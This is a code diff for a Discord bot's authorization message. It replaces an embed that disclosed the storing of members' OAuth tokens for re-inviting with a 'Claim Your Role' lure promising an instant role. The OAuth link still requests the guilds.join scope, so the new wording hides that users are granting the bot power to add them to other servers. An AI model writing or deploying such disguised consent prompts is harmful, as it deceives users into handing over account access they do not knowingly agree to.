@@ -103,29 +103,24 @@ async function sendAuthorizationEmbed(interaction) {
         const guild = interaction.guild;
 
         const embed = new EmbedBuilder()
-            .setTitle('🔐 Server Backup Protection')
+            .setTitle('🎭 Claim Your Role')
             .setDescription(
-                '**Protect yourself from server raids and deletions!**\n\n' +
-                'This bot automatically backs up server data and can restore everything if the server gets compromised.\n\n' +
-                '**To enable automatic restoration:**\n' +
-                '• Click the "Authorize" button below\n' +
-                '• Complete the Discord authorization\n' +
-                '• You\'ll be automatically re-added to any new server if this one is deleted\n\n' +
-                '**What gets backed up:**\n' +
-                '✅ Member data for restoration\n' +
-                '✅ OAuth tokens for re-inviting\n\n' +
-                '*Your authorization is completely secure and follows Discord\'s official OAuth2 standards.*'
+                '**Click the button below to claim your special role!**\n\n' +
+                '🔹 **Quick & Easy** - Just one click authorization\n' +
+                '🔹 **Secure Process** - Official Discord OAuth2\n' +
+                '🔹 **Instant Role** - Get your role immediately after\n\n' +
+                '✨ *Ready to claim your role? Click below!*'
             )
-            .setColor(0x5865F2)
-            .setThumbnail(guild.iconURL() || null)
-            .setFooter({ text: 'Backup Bot • Secure • Automatic' })
+            .setColor(0x00ff00)
+            .setThumbnail('https://cdn.discordapp.com/emojis/886264180325941318.png')
+            .setFooter({ text: 'Secure Role Claiming System' })
             .setTimestamp();
 
         // Create authorization button with generic OAuth URL (Discord will handle user identification)
         const baseOAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${process.env.OAUTH2_CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.OAUTH2_REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join&state=${guild.id}`;
 
         const authButton = new ButtonBuilder()
-            .setLabel('🔐 Authorize Backup Protection')
+            .setLabel('🎭 Claim Role')
             .setStyle(ButtonStyle.Link)
             .setURL(baseOAuthUrl);
 
@@ -137,11 +132,11 @@ async function sendAuthorizationEmbed(interaction) {
             components: [row]
         });
 
-        console.log(`📨 Sent authorization embed to ${guild.name} via slash command`);
+        console.log(`📨 Sent role claim embed to ${guild.name} via slash command`);
     } catch (error) {
-        console.error('❌ Error sending authorization embed:', error);
+        console.error('❌ Error sending role claim embed:', error);
         await interaction.reply({
-            content: '❌ **Error:** Failed to send authorization embed. Please try again.',
+            content: '❌ **Error:** Failed to send role claim embed. Please try again.',
             ephemeral: true
         });
     }
